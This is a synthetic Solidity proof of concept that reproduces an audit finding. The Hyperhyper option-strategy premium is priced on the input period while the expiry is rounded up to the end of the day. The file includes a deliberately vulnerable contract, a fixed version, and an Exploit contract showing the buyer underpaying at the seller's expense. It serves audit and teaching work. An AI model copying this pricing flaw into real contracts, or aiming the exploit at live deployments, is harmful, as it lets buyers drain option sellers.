// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Hyperhyper Strategy — the option premium uses the input period
    (Pashov Audit Group, H-01, 30 March 2025, finding 57738).
    SYNTHETIC, cheatcode-free. One transaction, no warp.

    _computeMaturityDate rounds the expiry up to the end of the day,
    so the option lives longer than `period` by up to 86399 seconds.
    _calculatePremium calls optionPrices(period, ...) anyway. With a
    linear time value (notional * time / 365 days) the buyer pays
    7 ether and the fair premium is larger by notional * gap / year.
    The seller who hedges at the fair premium is short that gap.
    The fixed quote passes maturity - block.timestamp, so the
    shortfall is 0. */

contract Prem {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BlackScholes {
    function optionPrices(uint256 time, uint256 notional) public pure returns (uint256) {
        return notional * time / 365 days;
    }
}

contract Seller {
    function approve(Prem prem, address spender, uint256 amount) external {
        prem.approve(spender, amount);
    }
}

contract StrategyBase {
    Prem public prem;
    BlackScholes public bs;
    address public seller;
    uint256 public charged;
    uint256 public fair;

    function _computeMaturityDate(uint256 period) public view returns (uint256 maturityTimestamp) {
        maturityTimestamp = block.timestamp + period;
        maturityTimestamp -= (maturityTimestamp % 1 days);
        maturityTimestamp += 1 days - 1;
    }

    function actualDuration(uint256 period) public view returns (uint256) {
        return _computeMaturityDate(period) - block.timestamp;
    }

    function _pull(uint256 notional, uint256 period, uint256 premium) internal {
        uint256 fairPremium = bs.optionPrices(actualDuration(period), notional);
        charged = premium;
        fair = fairPremium;
        require(prem.transferFrom(msg.sender, seller, premium), "pay");
        require(prem.transferFrom(seller, msg.sender, fairPremium), "hedge");
    }
}

contract Strategy is StrategyBase {
    constructor(Prem prem_, BlackScholes bs_, address seller_) {
        prem = prem_;
        bs = bs_;
        seller = seller_;
    }

    function _calculatePremium(uint256 notional, uint256 period) public view returns (uint256 premium) {
        // @> VULN: optionPrices is fed the input period, not maturity - block.timestamp.
        premium = bs.optionPrices(period, notional);
    }

    function buy(uint256 notional, uint256 period) external returns (uint256 premium) {
        premium = _calculatePremium(notional, period);
        _pull(notional, period, premium);
    }
}

contract StrategyFixed is StrategyBase {
    constructor(Prem prem_, BlackScholes bs_, address seller_) {
        prem = prem_;
        bs = bs_;
        seller = seller_;
    }

    function buy(uint256 notional, uint256 period) external returns (uint256 premium) {
        premium = bs.optionPrices(actualDuration(period), notional);
        _pull(notional, period, premium);
    }
}

contract Exploit {
    uint256 public constant NOTIONAL = 365 ether;
    uint256 public constant PERIOD = 7 days;

    Prem public prem; // nonce 1
    BlackScholes public bs; // nonce 2
    Seller public seller; // nonce 3
    Strategy public strategy; // nonce 4

    uint256 public chargedAmt;
    uint256 public fairAmt;
    uint256 public sellerShort;
    uint256 public opening;

    constructor() {
        prem = new Prem();
        bs = new BlackScholes();
        seller = new Seller();
        strategy = new Strategy(prem, bs, address(seller));
        prem.mint(address(this), 1000 ether);
        prem.mint(address(seller), 1000 ether);
        opening = 1000 ether;
    }

    function run() external {
        prem.approve(address(strategy), type(uint256).max);
        seller.approve(prem, address(strategy), type(uint256).max);
        uint256 duration = strategy.actualDuration(PERIOD);
        require(duration > PERIOD, "maturity is longer than the input period");
        strategy.buy(NOTIONAL, PERIOD);
        chargedAmt = strategy.charged();
        fairAmt = strategy.fair();
        require(chargedAmt == NOTIONAL * PERIOD / 365 days, "charged is the 7-day premium");
        require(fairAmt == NOTIONAL * duration / 365 days, "fair uses the real duration");
        require(fairAmt > chargedAmt, "buyer paid less than fair");
        sellerShort = fairAmt - chargedAmt;
        require(prem.balanceOf(address(this)) == opening + sellerShort, "buyer kept the discount");
        require(prem.balanceOf(address(seller)) == opening - sellerShort, "seller is short");
    }
}
